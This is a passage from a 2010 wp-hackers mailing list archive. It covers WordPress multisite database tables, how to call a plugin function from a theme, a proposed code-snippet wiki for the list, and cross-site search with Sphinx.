In-Reply-To: <AANLkTiljk-01mMkhfY5lYPo7sZd7c6I65P0kYAnTuo1v@mail.gmail.com>
References: <AANLkTilFtqEdpAFF9fQJSpwY89qrSwwu1KXNeHhJEjhM@mail.gmail.com> 
	<005301cb275d$7f2712a0$7d7537e0$@com>
	<AANLkTimTemgEW2RAGseu3M4aZFd5EC5JRNTwuZEpkoyn@mail.gmail.com> 
	<AANLkTinUjJvXUQFBGSVq8AA-rHABaIQlLdW81XeYu67z@mail.gmail.com> 
	<AANLkTimsxKdaFX6T0e1S3D22Vmgx3fZbz7IscyXX1mDn@mail.gmail.com> 
	<AANLkTimNDegMbTL1FPN50hT0WRnPivZN59Osinv6WWTd@mail.gmail.com> 
	<AANLkTin-XSPR88QyLSobcU88Fm5X5mtaDIS7bbCbCSSX@mail.gmail.com> 
	<AANLkTinWkf7b6Yrd4SytovFh4tgMiameO0mnIIvlnO0n@mail.gmail.com> 
	<AANLkTiljk-01mMkhfY5lYPo7sZd7c6I65P0kYAnTuo1v@mail.gmail.com>
Message-ID: <AANLkTinm7sMm_ne71Idem1e9LEKJXH3KGoxdLw3KDhne@mail.gmail.com>

Thanks a lot for your clarifcation :)

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Wed, Jul 21, 2010 at 12:51 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Wed, Jul 21, 2010 at 3:12 AM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > I can't see any other table related to Multisite. Is there any other?
> >
> > Yes .. Specifically, one the Tools > Network screen checks for, which is
> wp_site. Some of the ones you mentioned are plugin tables or tables from
> another install with a separate prefix. Multisite has six tables: blogs,
> blog_versions, registration_log, site, sitemeta, signups. Additionally,
> sitecategories, if you have global terms enabled.
>
>
> > And what are those two files added to the users table? I can just see 4
> > users. I tried removing all the users except admin but that did nothing.
> Am
> > I looking at the right place? There is nothing related to the options
> table
> > too.
>
>
> Fields, not files/records -- the "deleted" and "spam" fields.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From christian at buro2.se  Wed Jul 21 08:48:43 2010
From: christian at buro2.se (Christian Gundersson)
Date: Wed, 21 Jul 2010 10:48:43 +0200
Subject: [wp-hackers] Accessing a plugins function from theme
Message-ID: <000001cb28b1$87731620$96594260$@se>

Hi all!

 

Is there any way that I can access a function in a plugin from a theme? Say,
for example, my plugin has a function foo() that I want to access from the
theme. I assumed that the functions would be available to theme files when
they load.

 

I thought about using a filter and a meta tag (like [my_plugin_foo] and
parsing all posts for a replace) or putting foo() in my functions.php file,
but I'm kind of anal and would like to keep the plugin code in the plugin.

 

I haven't found anything regarding this on the codex or on google so any
pointers to a resource would be appreciated.

 

Thanks! (Oh, and if this is absolutely stupid, feel free to say so J)

 

//Christian


From mikeschinkel at newclarity.net  Wed Jul 21 08:56:16 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 21 Jul 2010 04:56:16 -0400
Subject: [wp-hackers] Accessing a plugins function from theme
In-Reply-To: <000001cb28b1$87731620$96594260$@se>
References: <000001cb28b1$87731620$96594260$@se>
Message-ID: <3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>

Yes, any functions in your plugin go into PHP's global name space and will be accessible from your theme.

-Mike

On Jul 21, 2010, at 4:48 AM, Christian Gundersson wrote:

> Hi all!
> 
> 
> 
> Is there any way that I can access a function in a plugin from a theme? Say,
> for example, my plugin has a function foo() that I want to access from the
> theme. I assumed that the functions would be available to theme files when
> they load.
> 
> 
> 
> I thought about using a filter and a meta tag (like [my_plugin_foo] and
> parsing all posts for a replace) or putting foo() in my functions.php file,
> but I'm kind of anal and would like to keep the plugin code in the plugin.
> 
> 
> 
> I haven't found anything regarding this on the codex or on google so any
> pointers to a resource would be appreciated.
> 
> 
> 
> Thanks! (Oh, and if this is absolutely stupid, feel free to say so J)
> 
> 
> 
> //Christian
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wp at andrewnacin.com  Wed Jul 21 09:02:07 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 21 Jul 2010 05:02:07 -0400
Subject: [wp-hackers] Accessing a plugins function from theme
In-Reply-To: <3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>
References: <000001cb28b1$87731620$96594260$@se>
	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>
Message-ID: <AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>

On Jul 21, 2010, at 4:48 AM, Christian Gundersson wrote:

> Is there any way that I can access a function in a plugin from a theme?
>

On Wed, Jul 21, 2010 at 4:56 AM, Mike Schinkel <mikeschinkel at newclarity.net>
 wrote:

> Yes, any functions in your plugin go into PHP's global name space and will
> be accessible from your theme.
>

You may also wish to wrap that function in a function_exists() call to
ensure that the theme doesn't error out if the plugin is deactivated.

You may also be interested in this blog post on rethinking how functions
defined in plugins could be used in themes:
http://www.andrewnacin.com/2010/05/18/rethinking-template-tags-in-plugins/

From ashishsainiashfame at gmail.com  Wed Jul 21 09:06:48 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Wed, 21 Jul 2010 14:36:48 +0530
Subject: [wp-hackers] Accessing a plugins function from theme
In-Reply-To: <000001cb28b1$87731620$96594260$@se>
References: <000001cb28b1$87731620$96594260$@se>
Message-ID: <AANLkTinyyC6C_t41bwhrT6wJUpWuu6G2Q-oqoEDpYFJm@mail.gmail.com>

Yes! You can

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Wed, Jul 21, 2010 at 2:18 PM, Christian Gundersson <christian at buro2.se>wrote:

> Hi all!
>
>
>
> Is there any way that I can access a function in a plugin from a theme?
> Say,
> for example, my plugin has a function foo() that I want to access from the
> theme. I assumed that the functions would be available to theme files when
> they load.
>
>
>
> I thought about using a filter and a meta tag (like [my_plugin_foo] and
> parsing all posts for a replace) or putting foo() in my functions.php file,
> but I'm kind of anal and would like to keep the plugin code in the plugin.
>
>
>
> I haven't found anything regarding this on the codex or on google so any
> pointers to a resource would be appreciated.
>
>
>
> Thanks! (Oh, and if this is absolutely stupid, feel free to say so J)
>
>
>
> //Christian
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From christian at buro2.se  Wed Jul 21 09:21:23 2010
From: christian at buro2.se (Christian Gundersson)
Date: Wed, 21 Jul 2010 11:21:23 +0200
Subject: [wp-hackers] Accessing a plugins function from theme
In-Reply-To: <AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>
References: <000001cb28b1$87731620$96594260$@se>	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>
	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>
Message-ID: <000501cb28b6$177f03b0$467d0b10$@se>

Hi,

Thanks for the replies. I see now that I probably should have clarified a
bit more :)

I have done this but my function isn't getting called like it should. I get
a "call to undefined function" error when I access the theme file.

I have declared a function foo() in my plugins base file. I haven't attached
it to any filters or hooks of any kind. In my theme file I call the function
simply by 

if ( function_exists ( 'foo' ) )
foo();

Have I missed anything, or should that "just work"?

Thanks again!

//Christian



-----Ursprungligt meddelande-----
Fr?n: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] F?r Andrew Nacin
Skickat: den 21 juli 2010 11:02
Till: wp-hackers at lists.automattic.com
?mne: Re: [wp-hackers] Accessing a plugins function from theme

On Jul 21, 2010, at 4:48 AM, Christian Gundersson wrote:

> Is there any way that I can access a function in a plugin from a theme?
>

On Wed, Jul 21, 2010 at 4:56 AM, Mike Schinkel <mikeschinkel at newclarity.net>
 wrote:

> Yes, any functions in your plugin go into PHP's global name space and will
> be accessible from your theme.
>

You may also wish to wrap that function in a function_exists() call to
ensure that the theme doesn't error out if the plugin is deactivated.

You may also be interested in this blog post on rethinking how functions
defined in plugins could be used in themes:
http://www.andrewnacin.com/2010/05/18/rethinking-template-tags-in-plugins/
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Wed Jul 21 09:24:01 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 21 Jul 2010 05:24:01 -0400
Subject: [wp-hackers] Accessing a plugins function from theme
In-Reply-To: <000501cb28b6$177f03b0$467d0b10$@se>
References: <000001cb28b1$87731620$96594260$@se>	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>
	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>
	<000501cb28b6$177f03b0$467d0b10$@se>
Message-ID: <762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>

Obvious question, but; I assume you've activated the plugin?
If yes, your function isn't wrapped in a class, is it?

-Mike

On Jul 21, 2010, at 5:21 AM, Christian Gundersson wrote:

> Hi,
> 
> Thanks for the replies. I see now that I probably should have clarified a
> bit more :)
> 
> I have done this but my function isn't getting called like it should. I get
> a "call to undefined function" error when I access the theme file.
> 
> I have declared a function foo() in my plugins base file. I haven't attached
> it to any filters or hooks of any kind. In my theme file I call the function
> simply by 
> 
> if ( function_exists ( 'foo' ) )
> foo();
> 
> Have I missed anything, or should that "just work"?
> 
> Thanks again!
> 
> //Christian
> 
> 


From christian at buro2.se  Wed Jul 21 09:30:06 2010
From: christian at buro2.se (Christian Gundersson)
Date: Wed, 21 Jul 2010 11:30:06 +0200
Subject: [wp-hackers] Accessing a plugins function from theme
In-Reply-To: <762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>
References: <000001cb28b1$87731620$96594260$@se>	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>	<000501cb28b6$177f03b0$467d0b10$@se>
	<762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>
Message-ID: <000d01cb28b7$4f131d10$ed395730$@se>

The plugin is activated and working for all other intents and purposes, and
it's not wrapped in a class either.

As a side thought, if the function would produce a fatal error in itself
when the plugin file is parsed, would that keep the definition from being
read, or would it be still be "callable" and then generate an error?

//Christian

-----Ursprungligt meddelande-----
Fr?n: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] F?r Mike Schinkel
Skickat: den 21 juli 2010 11:24
Till: wp-hackers at lists.automattic.com
?mne: Re: [wp-hackers] Accessing a plugins function from theme

Obvious question, but; I assume you've activated the plugin?
If yes, your function isn't wrapped in a class, is it?

-Mike

On Jul 21, 2010, at 5:21 AM, Christian Gundersson wrote:

> Hi,
> 
> Thanks for the replies. I see now that I probably should have clarified a
> bit more :)
> 
> I have done this but my function isn't getting called like it should. I
get
> a "call to undefined function" error when I access the theme file.
> 
> I have declared a function foo() in my plugins base file. I haven't
attached
> it to any filters or hooks of any kind. In my theme file I call the
function
> simply by 
> 
> if ( function_exists ( 'foo' ) )
> foo();
> 
> Have I missed anything, or should that "just work"?
> 
> Thanks again!
> 
> //Christian
> 
> 

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Wed Jul 21 09:37:15 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 21 Jul 2010 05:37:15 -0400
Subject: [wp-hackers] Accessing a plugins function from theme
In-Reply-To: <000d01cb28b7$4f131d10$ed395730$@se>
References: <000001cb28b1$87731620$96594260$@se>	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>	<000501cb28b6$177f03b0$467d0b10$@se>
	<762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>
	<000d01cb28b7$4f131d10$ed395730$@se>
Message-ID: <BD913887-2098-4FAB-9B3F-713D7CB2AD7A@newclarity.net>

What's the error output look like?


On Jul 21, 2010, at 5:30 AM, Christian Gundersson wrote:

> The plugin is activated and working for all other intents and purposes, and
> it's not wrapped in a class either.
> 
> As a side thought, if the function would produce a fatal error in itself
> when the plugin file is parsed, would that keep the definition from being
> read, or would it be still be "callable" and then generate an error?
> 
> //Christian
> 
> -----Ursprungligt meddelande-----
> Fr?n: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] F?r Mike Schinkel
> Skickat: den 21 juli 2010 11:24
> Till: wp-hackers at lists.automattic.com
> ?mne: Re: [wp-hackers] Accessing a plugins function from theme
> 
> Obvious question, but; I assume you've activated the plugin?
> If yes, your function isn't wrapped in a class, is it?
> 
> -Mike
> 
> On Jul 21, 2010, at 5:21 AM, Christian Gundersson wrote:
> 
>> Hi,
>> 
>> Thanks for the replies. I see now that I probably should have clarified a
>> bit more :)
>> 
>> I have done this but my function isn't getting called like it should. I
> get
>> a "call to undefined function" error when I access the theme file.
>> 
>> I have declared a function foo() in my plugins base file. I haven't
> attached
>> it to any filters or hooks of any kind. In my theme file I call the
> function
>> simply by 
>> 
>> if ( function_exists ( 'foo' ) )
>> foo();
>> 
>> Have I missed anything, or should that "just work"?
>> 
>> Thanks again!
>> 
>> //Christian
>> 
>> 
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From christian at buro2.se  Wed Jul 21 09:42:24 2010
From: christian at buro2.se (Christian Gundersson)
Date: Wed, 21 Jul 2010 11:42:24 +0200
Subject: [wp-hackers] Accessing a plugins function from theme
In-Reply-To: <762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>
References: <000001cb28b1$87731620$96594260$@se>	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>	<000501cb28b6$177f03b0$467d0b10$@se>
	<762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>
Message-ID: <000e01cb28b9$06f213e0$14d63ba0$@se>

Hi again,

I found the culprit. For some inexplicable reason my ftp program repeatedly
chose not to upload the file to the test host. No error or anything, just
didn't move the file.

This is a non issue, but thanks all for the help anyway.

(Stupid isn't a punishable offense is it? :))

//Christian 

-----Ursprungligt meddelande-----
Fr?n: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] F?r Mike Schinkel
Skickat: den 21 juli 2010 11:24
Till: wp-hackers at lists.automattic.com
?mne: Re: [wp-hackers] Accessing a plugins function from theme

Obvious question, but; I assume you've activated the plugin?
If yes, your function isn't wrapped in a class, is it?

-Mike

On Jul 21, 2010, at 5:21 AM, Christian Gundersson wrote:

> Hi,
> 
> Thanks for the replies. I see now that I probably should have clarified a
> bit more :)
> 
> I have done this but my function isn't getting called like it should. I
get
> a "call to undefined function" error when I access the theme file.
> 
> I have declared a function foo() in my plugins base file. I haven't
attached
> it to any filters or hooks of any kind. In my theme file I call the
function
> simply by 
> 
> if ( function_exists ( 'foo' ) )
> foo();
> 
> Have I missed anything, or should that "just work"?
> 
> Thanks again!
> 
> //Christian
> 
> 

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Wed Jul 21 09:45:26 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 21 Jul 2010 05:45:26 -0400
Subject: [wp-hackers] Accessing a plugins function from theme
In-Reply-To: <000e01cb28b9$06f213e0$14d63ba0$@se>
References: <000001cb28b1$87731620$96594260$@se>	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>	<000501cb28b6$177f03b0$467d0b10$@se>
	<762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>
	<000e01cb28b9$06f213e0$14d63ba0$@se>
Message-ID: <C3EDF9C2-630C-4A7E-84CE-5C6D6B9F45FD@newclarity.net>

On Jul 21, 2010, at 5:42 AM, Christian Gundersson wrote:
> (Stupid isn't a punishable offense is it? :))

Not normally, but here on wp-hackers? Well... ;-)

BTW, suggestion: Set up a local dev environment; local is a much better place to debug.

-Mike

From KrisY at tbs.uk.com  Wed Jul 21 10:27:14 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Wed, 21 Jul 2010 11:27:14 +0100
Subject: [wp-hackers]  wp-hackers.com
In-Reply-To: <C3EDF9C2-630C-4A7E-84CE-5C6D6B9F45FD@newclarity.net>
References: <000001cb28b1$87731620$96594260$@se>	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>	<000501cb28b6$177f03b0$467d0b10$@se><762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net><000e01cb28b9$06f213e0$14d63ba0$@se>
	<C3EDF9C2-630C-4A7E-84CE-5C6D6B9F45FD@newclarity.net>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E3113@tbs-sbs01.TBS.local>

Hi all,

I've just registered this domain. Whether or not I should do anything
with it is up to those of you who use this mailing list, and if any of
you would be willing to help collaborate on it in any way. The possible
idea was to create something along the lines of PasteBin where you can
link to code snippets and post those here rather than pasting plain-text
back and forth for others to comprehend. Potentially, I was thinking of
hypothetical scenarios whereby someone could paste a little bit of code
in, and others are free to look at and edit it (with comments etc, in a
sort of blog format) until everyone reaches a solution. This would
differ a lot from the current mailing list setup in that all this stuff
could be archived, and linked to when someone asks a repeat question.
The comments involved would help that newbie understand why something
they've written is wrong, rather than just C+Ping a bit of code and
moving on without learning anything.

I know that would help me, anyway. I'm sure I'm not the only one. Any
ideas?

Kris

From scribu at gmail.com  Wed Jul 21 14:24:07 2010
From: scribu at gmail.com (scribu)
Date: Wed, 21 Jul 2010 17:24:07 +0300
Subject: [wp-hackers] wp-hackers.com
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E3113@tbs-sbs01.TBS.local>
References: <000001cb28b1$87731620$96594260$@se>
	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>
	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>
	<000501cb28b6$177f03b0$467d0b10$@se>
	<762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>
	<000e01cb28b9$06f213e0$14d63ba0$@se>
	<C3EDF9C2-630C-4A7E-84CE-5C6D6B9F45FD@newclarity.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E3113@tbs-sbs01.TBS.local>
Message-ID: <AANLkTikHGEgqyWGlDWz4PBWkcLsK11uUcfa0KvsB-m2-@mail.gmail.com>

So what you're suggesting basically is a wiki for WP code snippets. It's an
interesting idea.

Snippets could be locked from editing when the optimal solution is found or
after a certain period.


-- 
http://scribu.net

From KrisY at tbs.uk.com  Wed Jul 21 15:15:40 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Wed, 21 Jul 2010 16:15:40 +0100
Subject: [wp-hackers] wp-hackers.com
In-Reply-To: <AANLkTikHGEgqyWGlDWz4PBWkcLsK11uUcfa0KvsB-m2-@mail.gmail.com>
References: <000001cb28b1$87731620$96594260$@se><3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net><AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com><000501cb28b6$177f03b0$467d0b10$@se><762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net><000e01cb28b9$06f213e0$14d63ba0$@se><C3EDF9C2-630C-4A7E-84CE-5C6D6B9F45FD@newclarity.net><CD47955B7E065D48AB5CF226C2ED75C02E3113@tbs-sbs01.TBS.local>
	<AANLkTikHGEgqyWGlDWz4PBWkcLsK11uUcfa0KvsB-m2-@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E312D@tbs-sbs01.TBS.local>

Definitely along those lines. The idea of locking a solution that has
been generally accepted is definitely worth pushing.

Seeing as it would directly correspond to this mailing list, it's
probably best for me to ask before attempting anything.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of scribu
Sent: 21 July 2010 15:24
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] wp-hackers.com

So what you're suggesting basically is a wiki for WP code snippets. It's
an
interesting idea.

Snippets could be locked from editing when the optimal solution is found
or
after a certain period.


-- 
http://scribu.net
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From banago at gmail.com  Wed Jul 21 15:27:12 2010
From: banago at gmail.com (Baki Goxhaj)
Date: Wed, 21 Jul 2010 17:27:12 +0200
Subject: [wp-hackers] wp-hackers.com
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E312D@tbs-sbs01.TBS.local>
References: <000001cb28b1$87731620$96594260$@se>
	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>
	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>
	<000501cb28b6$177f03b0$467d0b10$@se>
	<762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>
	<000e01cb28b9$06f213e0$14d63ba0$@se>
	<C3EDF9C2-630C-4A7E-84CE-5C6D6B9F45FD@newclarity.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E3113@tbs-sbs01.TBS.local>
	<AANLkTikHGEgqyWGlDWz4PBWkcLsK11uUcfa0KvsB-m2-@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E312D@tbs-sbs01.TBS.local>
Message-ID: <AANLkTimon6EWh2aDvSDUnp7vFoSm6yA_Odo_3GFWXKHG@mail.gmail.com>

Cool idea - I am looking for a solution to collect me code snippets.

Kindly,

Baki Goxhaj
www.wplancer.com | www.banago.info | www.lintuts.com


On 21 July 2010 17:15, Kris Young <KrisY at tbs.uk.com> wrote:

> Definitely along those lines. The idea of locking a solution that has
> been generally accepted is definitely worth pushing.
>
> Seeing as it would directly correspond to this mailing list, it's
> probably best for me to ask before attempting anything.
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of scribu
> Sent: 21 July 2010 15:24
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] wp-hackers.com
>
> So what you're suggesting basically is a wiki for WP code snippets. It's
> an
> interesting idea.
>
> Snippets could be locked from editing when the optimal solution is found
> or
> after a certain period.
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From prodevstudio+wordpress at gmail.com  Wed Jul 21 16:31:07 2010
From: prodevstudio+wordpress at gmail.com (Azizur Rahman)
Date: Wed, 21 Jul 2010 17:31:07 +0100
Subject: [wp-hackers] wp-hackers.com
In-Reply-To: <AANLkTimon6EWh2aDvSDUnp7vFoSm6yA_Odo_3GFWXKHG@mail.gmail.com>
References: <000001cb28b1$87731620$96594260$@se>
	<3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net> 
	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com> 
	<000501cb28b6$177f03b0$467d0b10$@se>
	<762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net> 
	<000e01cb28b9$06f213e0$14d63ba0$@se>
	<C3EDF9C2-630C-4A7E-84CE-5C6D6B9F45FD@newclarity.net> 
	<CD47955B7E065D48AB5CF226C2ED75C02E3113@tbs-sbs01.TBS.local> 
	<AANLkTikHGEgqyWGlDWz4PBWkcLsK11uUcfa0KvsB-m2-@mail.gmail.com> 
	<CD47955B7E065D48AB5CF226C2ED75C02E312D@tbs-sbs01.TBS.local> 
	<AANLkTimon6EWh2aDvSDUnp7vFoSm6yA_Odo_3GFWXKHG@mail.gmail.com>
Message-ID: <AANLkTimvIhBWxT1frQmRqbv_I0ntcsyHvkFUjhPvrD09@mail.gmail.com>

I already use http://gist.github.com for code snippets.

Just wondering how this would add value and improve what already exists
(i.e.: codex).

Here is my suggestions run a system on the site that will scrape for code
snippets and suggest to moderator to place them in appropriate places in
Codex.

If I am stuck with something wp related, I'd search codex and that's where I
want those optimal code snippets as an example.

Whatever system you use should be integrated with this mailing list or
wp.org account, I am not keen on creating another account for yet another
site.

Kind Regards,
Azizur Rahman

----
Do you need cost-effective web hosting solution and Domain name try
http://prodevstudio.com

Missed the last Friday Khutbah, try catchup a Khutbah on-line now at
http://fridaykhutbah.com


On Wed, Jul 21, 2010 at 4:27 PM, Baki Goxhaj <banago at gmail.com> wrote:

> Cool idea - I am looking for a solution to collect me code snippets.
>
> Kindly,
>
> Baki Goxhaj
> www.wplancer.com | www.banago.info | www.lintuts.com
>
>
> On 21 July 2010 17:15, Kris Young <KrisY at tbs.uk.com> wrote:
>
> > Definitely along those lines. The idea of locking a solution that has
> > been generally accepted is definitely worth pushing.
> >
> > Seeing as it would directly correspond to this mailing list, it's
> > probably best for me to ask before attempting anything.
> >
> > -----Original Message-----
> > From: wp-hackers-bounces at lists.automattic.com
> > [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of scribu
> > Sent: 21 July 2010 15:24
> > To: wp-hackers at lists.automattic.com
> > Subject: Re: [wp-hackers] wp-hackers.com
> >
> > So what you're suggesting basically is a wiki for WP code snippets. It's
> > an
> > interesting idea.
> >
> > Snippets could be locked from editing when the optimal solution is found
> > or
> > after a certain period.
> >
> >
> > --
> > http://scribu.net
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From danielbachhuber at gmail.com  Wed Jul 21 16:31:43 2010
From: danielbachhuber at gmail.com (Daniel Bachhuber)
Date: Wed, 21 Jul 2010 12:31:43 -0400
Subject: [wp-hackers] Searching across entire multisite network with Sphinx
Message-ID: <F51FE440-2520-47DF-8108-E87BBC8050DE@gmail.com>

Hey all,
I'm in the process of setting up a new WordPress 3.0 multisite instance and would like to have search on the main site query across all of the sites in the network.

Initially, my thought was to use Sphinx, and the WP Sphinx Search plugin, but I've run into a significant issue in that I can't dynamically add new sites to the mix. It's detailed more in depth here:

http://stackoverflow.com/questions/3301145/configuring-sphinx-to-index-a-dynamic-set-of-tables

My question for the WordPress crowd, however, is this: is there a better way to offer search across all of the sites on the network?

Ideally, this would be a self-hosted solution that I could performance tune, also supported the different BuddyPress content types (members, groups, activity updates, etc.), and was agnostic about custom domain mapping as some sites will be a subdomain of the primary site while others will be on their own domain.

Thanks much in advance,

Daniel

--
Daniel Bachhuber
danielbachhuber.com
danielbachhuber at gmail.com
+1 (971) 998-5407
aim/skype/twitter: danielbachhuber


From KrisY at tbs.uk.com  Wed Jul 21 16:36:35 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Wed, 21 Jul 2010 17:36:35 +0100
Subject: [wp-hackers] wp-hackers.com
In-Reply-To: <AANLkTimvIhBWxT1frQmRqbv_I0ntcsyHvkFUjhPvrD09@mail.gmail.com>
References: <000001cb28b1$87731620$96594260$@se><3D777F1F-2907-4019-AAE4-F38ABE0809D4@newclarity.net>
	<AANLkTinVj6rF8Ceyerw7lKPm2jk9_ehfg8W2TqBl9k45@mail.gmail.com>
	<000501cb28b6$177f03b0$467d0b10$@se><762D9470-F695-43DA-9430-C0B1D7CC9F8F@newclarity.net>
	<000e01cb28b9$06f213e0$14d63ba0$@se><C3EDF9C2-630C-4A7E-84CE-5C6D6B9F45FD@newclarity.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E3113@tbs-sbs01.TBS.local>
	<AANLkTikHGEgqyWGlDWz4PBWkcLsK11uUcfa0KvsB-m2-@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E312D@tbs-sbs01.TBS.local>
	<AANLkTimon6EWh2aDvSDUnp7vFoSm6yA_Odo_3GFWXKHG@mail.gmail.com>
	<AANLkTimvIhBWxT1frQmRqbv_I0ntcsyHvkFUjhPvrD09@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E3133@tbs-sbs01.TBS.local>

I already use http://gist.github.com for code snippets.

Just wondering how this would add value and improve what already exists
(i.e.: codex).

Here is my suggestions run a system on the site that will scrape for
code
